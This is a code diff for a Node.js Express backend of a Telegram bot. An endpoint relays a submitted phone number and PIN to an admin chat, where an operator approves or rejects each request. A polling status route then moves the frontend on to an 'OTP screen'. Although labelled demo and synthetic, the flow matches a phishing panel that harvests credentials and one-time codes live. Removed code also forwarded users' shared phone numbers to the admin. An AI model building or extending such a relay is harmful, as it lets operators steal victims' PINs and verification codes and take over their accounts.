@@ -5,10 +5,6 @@ const cors = require("cors");
 
 const app = express();
 
-// ==========================================
-// MIDDLEWARE
-// ==========================================
-
 app.use(cors());
 app.use(express.json());
 
@@ -29,6 +25,10 @@ if (!ADMIN_CHAT_ID) {
 
 const TELEGRAM_API =
     `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// Temporary demo requests.
+// These are intentionally in memory only.
+const demoRequests = new Map();
 
 // ==========================================
 // TELEGRAM API
@@ -69,13 +69,8 @@ async function telegram(method, data = {}) {
 // SEND MESSAGE
 // ==========================================
 
-async function sendMessage(
-    chatId,
-    text,
-    options = {}
-) {
+async function sendMessage(chatId, text, options = {}) {
     if (!chatId) {
-        console.error("❌ Chat ID is missing.");
         return null;
     }
 
@@ -94,15 +89,8 @@ async function sendMessage(
 // ADMIN MESSAGE
 // ==========================================
 
-async function notifyAdmin(
-    text,
-    options = {}
-) {
+async function notifyAdmin(text, options = {}) {
     if (!ADMIN_CHAT_ID) {
-        console.log(
-            "⚠️ TELEGRAM_ADMIN_CHAT_ID is not configured."
-        );
-
         return null;
     }
 
@@ -114,244 +102,7 @@ async function notifyAdmin(
 }
 
 // ==========================================
-// START
-// ==========================================
-
-async function handleStart(message) {
-    const chatId =
-        message.chat.id;
-
-    const firstName =
-        message.from?.first_name || "User";
-
-    const username =
-        message.from?.username
-            ? `@${message.from.username}`
-            : "No username";
-
-    await sendMessage(
-        chatId,
-
-        `👋 <b>Welcome, ${firstName}</b>\n\n` +
-        `Your Telegram account has been connected successfully.\n\n` +
-        `Please choose an option below:`,
-
-        {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {
-                            text: "📱 Share Phone Number",
-                            callback_data: "share_phone"
-                        }
-                    ],
-                    [
-                        {
-                            text: "✅ Start Verification",
-                            callback_data:
-                                "start_verification"
-                        }
-                    ]
-                ]
-            }
-        }
-    );
-
-    await notifyAdmin(
-        `🔔 <b>NEW TELEGRAM USER</b>\n\n` +
-        `Name: ${firstName}\n` +
-        `Username: ${username}\n` +
-        `Telegram ID: <code>${chatId}</code>`
-    );
-}
-
-// ==========================================
-// START VERIFICATION
-// ==========================================
-
-async function startVerification(chatId) {
-    await sendMessage(
-        chatId,
-
-        `🔐 <b>Verification Required</b>\n\n` +
-        `Please confirm that you want to continue ` +
-        `with the verification process.`,
-
-        {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {
-                            text: "✅ True",
-                            callback_data:
-                                "verification_true"
-                        },
-                        {
-                            text: "❌ False",
-                            callback_data:
-                                "verification_false"
-                        }
-                    ]
-                ]
-            }
-        }
-    );
-}
-
-// ==========================================
-// CALLBACKS
-// ==========================================
-
-async function handleCallback(callback) {
-    if (!callback.message) {
-        return;
-    }
-
-    const chatId =
-        callback.message.chat.id;
-
-    const data =
-        callback.data;
-
-    await telegram(
-        "answerCallbackQuery",
-        {
-            callback_query_id: callback.id
-        }
-    );
-
-    // --------------------------------------
-    // SHARE PHONE
-    // --------------------------------------
-
-    if (data === "share_phone") {
-        await sendMessage(
-            chatId,
-
-            `📱 <b>Phone Number</b>\n\n` +
-            `Tap the button below to share your ` +
-            `phone number with this bot.`,
-
-            {
-                reply_markup: {
-                    keyboard: [
-                        [
-                            {
-                                text:
-                                    "📱 Share My Phone Number",
-                                request_contact: true
-                            }
-                        ]
-                    ],
-                    resize_keyboard: true,
-                    one_time_keyboard: true
-                }
-            }
-        );
-
-        return;
-    }
-
-    // --------------------------------------
-    // START VERIFICATION
-    // --------------------------------------
-
-    if (data === "start_verification") {
-        await startVerification(chatId);
-        return;
-    }
-
-    // --------------------------------------
-    // TRUE
-    // --------------------------------------
-
-    if (data === "verification_true") {
-        await sendMessage(
-            chatId,
-
-            `✅ <b>Verification Confirmed</b>\n\n` +
-            `Your confirmation has been recorded.`
-        );
-
-        await notifyAdmin(
-            `✅ <b>VERIFICATION CONFIRMED</b>\n\n` +
-            `Telegram ID: <code>${chatId}</code>`
-        );
-
-        return;
-    }
-
-    // --------------------------------------
-    // FALSE
-    // --------------------------------------
-
-    if (data === "verification_false") {
-        await sendMessage(
-            chatId,
-
-            `❌ <b>Verification Cancelled</b>\n\n` +
-            `No verification was completed.`
-        );
-
-        await notifyAdmin(
-            `❌ <b>VERIFICATION CANCELLED</b>\n\n` +
-            `Telegram ID: <code>${chatId}</code>`
-        );
-
-        return;
-    }
-}
-
-// ==========================================
-// PHONE CONTACT
-// ==========================================
-
-async function handleContact(message) {
-    const chatId =
-        message.chat.id;
-
-    const contact =
-        message.contact;
-
-    if (!contact) {
-        return;
-    }
-
-    const phone =
-        contact.phone_number;
-
-    const firstName =
-        contact.first_name || "Unknown";
-
-    await sendMessage(
-        chatId,
-
-        `✅ <b>Phone Number Received</b>\n\n` +
-        `Name: ${firstName}\n` +
-        `Phone: ${phone}\n\n` +
-        `You can now continue.`,
-
-        {
-            reply_markup: {
-                remove_keyboard: true
-            }
-        }
-    );
-
-    await notifyAdmin(
-        `📱 <b>PHONE NUMBER SHARED</b>\n\n` +
-        `Name: ${firstName}\n` +
-        `Phone: <code>${phone}</code>\n` +
-        `Telegram ID: <code>${chatId}</code>`
-    );
-}
-
-// ==========================================
 // DEMO VERIFICATION
-// ==========================================
-//
-// Test-only endpoint.
-// Accepts synthetic demo values only.
 // ==========================================
 
 app.post(
@@ -373,10 +124,25 @@ app.post(
                 });
             }
 
+            // Generate a temporary demo request ID.
+            const requestId =
+                `DEMO-${Date.now()}-${Math.random()
+                    .toString(36)
+                    .substring(2, 8)}`;
+
+            demoRequests.set(
+                requestId,
+                {
+                    status: "pending",
+                    createdAt: Date.now()
+                }
+            );
+
             const message =
                 `🔔 <b>TEST VERIFICATION REQUEST</b>\n\n` +
                 `Phone: <code>${phone}</code>\n` +
                 `Test PIN: <code>${demoPin}</code>\n\n` +
+                `Request: <code>${requestId}</code>\n\n` +
                 `<b>Confirm test request:</b>`;
 
             const result =
@@ -389,12 +155,12 @@ app.post(
                                     {
                                         text: "✅ TRUE",
                                         callback_data:
-                                            "test_true"
+                                            `test_true:${requestId}`
                                     },
                                     {
                                         text: "❌ FALSE",
                                         callback_data:
-                                            "test_false"
+                                            `test_false:${requestId}`
                                     }
                                 ]
                             ]
@@ -403,6 +169,9 @@ app.post(
                 );
 
             if (!result?.ok) {
+
+                demoRequests.delete(requestId);
+
                 return res.status(500).json({
                     success: false,
                     message:
@@ -412,6 +181,8 @@ app.post(
 
             return res.json({
                 success: true,
+                requestId,
+                status: "pending",
                 message:
                     "Test verification request sent."
             });
@@ -426,26 +197,67 @@ app.post(
             return res.status(500).json({
                 success: false,
                 message:
-                    "Server error while processing test verification."
+                    "Server error."
             });
         }
     }
 );
 
 // ==========================================
-// TEST TRUE / FALSE
+// CHECK DEMO STATUS
+// ==========================================
+
+app.get(
+    "/demo-verification/status/:requestId",
+    (req, res) => {
+
+        const requestId =
+            req.params.requestId;
+
+        const request =
+            demoRequests.get(requestId);
+
+        if (!request) {
+            return res.status(404).json({
+                success: false,
+                message:
+                    "Demo request not found."
+            });
+        }
+
+        return res.json({
+            success: true,
+            requestId,
+            status: request.status
+        });
+    }
+);
+
+// ==========================================
+// HANDLE TEST DECISION
 // ==========================================
 
 async function handleTestDecision(
     callback,
-    approved
+    approved,
+    requestId
 ) {
-    if (!callback.message) {
-        return;
-    }
 
-    const chatId =
-        callback.message.chat.id;
+    const request =
+        demoRequests.get(requestId);
+
+    if (request) {
+
+        request.status =
+            approved
+                ? "approved"
+                : "rejected";
+
+        demoRequests.set(
+            requestId,
+            request
+        );
+    }
 
     await telegram(
         "answerCallbackQuery",
@@ -457,14 +269,21 @@ async function handleTestDecision(
         }
     );
 
+    const chatId =
+        callback.message?.chat?.id;
+
+    if (!chatId) {
+        return;
+    }
+
     if (approved) {
 
         await sendMessage(
             chatId,
 
             `✅ <b>TEST VERIFICATION APPROVED</b>\n\n` +
-            `The synthetic verification request ` +
-            `was marked TRUE.`
+            `The synthetic request was marked TRUE.\n\n` +
+            `The demo frontend can now continue to the Demo OTP screen.`
         );
 
     } else {
@@ -473,8 +292,7 @@ async function handleTestDecision(
             chatId,
 
             `❌ <b>TEST VERIFICATION REJECTED</b>\n\n` +
-            `The synthetic verification request ` +
-            `was marked FALSE.`
+            `The synthetic request was marked FALSE.`
         );
     }
 }
@@ -492,6 +310,10 @@ app.post(
             const update =
                 req.body;
 
+            // ------------------------------
+            // MESSAGES
+            // ------------------------------
+
             if (update.message) {
 
                 const message =
@@ -501,49 +323,137 @@ app.post(
                     message.text === "/start"
                 ) {
 
-                    await handleStart(
-                        message
-                    );
+                    const chatId =
+                        message.chat.id;
 
-                } else if (
+                    await sendMessage(
+                        chatId,
+
+                        `👋 <b>Welcome</b>\n\n` +
+                        `Your Telegram account has been connected successfully.\n\n` +
+                        `This bot is configured for demo testing.`,
+
+                        {
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [
+                                        {
+                                            text:
+                                                "📱 Share Phone Number",
+                                            callback_data:
+                                                "share_phone"
+                                        }
+                                    ]
+                                ]
+                            }
+                        }
+                    );
+                }
+
+                else if (
                     message.contact
                 ) {
 
-                    await handleContact(
-                        message
+                    const chatId =
+                        message.chat.id;
+
+                    const phone =
+                        message.contact.phone_number;
+
+                    await sendMessage(
+                        chatId,
+
+                        `✅ <b>Phone Number Received</b>\n\n` +
+                        `Phone: ${phone}`
                     );
                 }
             }
+
+            // ------------------------------
+            // CALLBACKS
+            // ------------------------------
 
             if (update.callback_query) {
 
                 const callback =
                     update.callback_query;
 
+                const data =
+                    callback.data || "";
+
                 if (
-                    callback.data ===
-                    "test_true"
+                    data.startsWith(
+                        "test_true:"
+                    )
                 ) {
+
+                    const requestId =
+                        data.substring(
+                            "test_true:".length
+                        );
 
                     await handleTestDecision(
                         callback,
-                        true
+                        true,
+                        requestId
                     );
 
-                } else if (
-                    callback.data ===
-                    "test_false"
+                }
+
+                else if (
+                    data.startsWith(
+                        "test_false:"
+                    )
                 ) {
+
+                    const requestId =
+                        data.substring(
+                            "test_false:".length
+                        );
 
                     await handleTestDecision(
                         callback,
-                        false
+                        false,
+                        requestId
+                    );
+                }
+
+                else if (
+                    data === "share_phone"
+                ) {
+
+                    await telegram(
+                        "answerCallbackQuery",
+                        {
+                            callback_query_id:
+                                callback.id
+                        }
                     );
 
-                } else {
+                    await sendMessage(
+                        callback.message.chat.id,
 
-                    await handleCallback(
-                        callback
+                        `📱 <b>Share Phone Number</b>\n\n` +
+                        `This is a demo-only phone sharing step.`,
+
+                        {
+                            reply_markup: {
+                                keyboard: [
+                                    [
+                                        {
+                                            text:
+                                                "📱 Share My Phone Number",
+                                            request_contact:
+                                                true
+                                        }
+                                    ]
+                                ],
+                                resize_keyboard:
+                                    true,
+                                one_time_keyboard:
+                                    true
+                            }
+                        }
                     );
                 }
             }
@@ -653,6 +563,34 @@ app.get(
 );
 
 // ==========================================
+// CLEAN OLD DEMO REQUESTS
+// ==========================================
+
+setInterval(
+    () => {
+
+        const now =
+            Date.now();
+
+        for (
+            const [id, request]
+            of demoRequests.entries()
+        ) {
+
+            if (
+                now - request.createdAt >
+                15 * 60 * 1000
+            ) {
+
+                demoRequests.delete(id);
+            }
+        }
+
+    },
+    5 * 60 * 1000
+);
+
+// ==========================================
 // SERVER
 // ==========================================
 
@@ -661,8 +599,7 @@ app.listen(
     () => {
 
         console.log(
-            `🚀 Telegram Bot Backend ` +
-            `running on port ${PORT}`
+            `🚀 Telegram Bot Backend running on port ${PORT}`
         );
 
     }
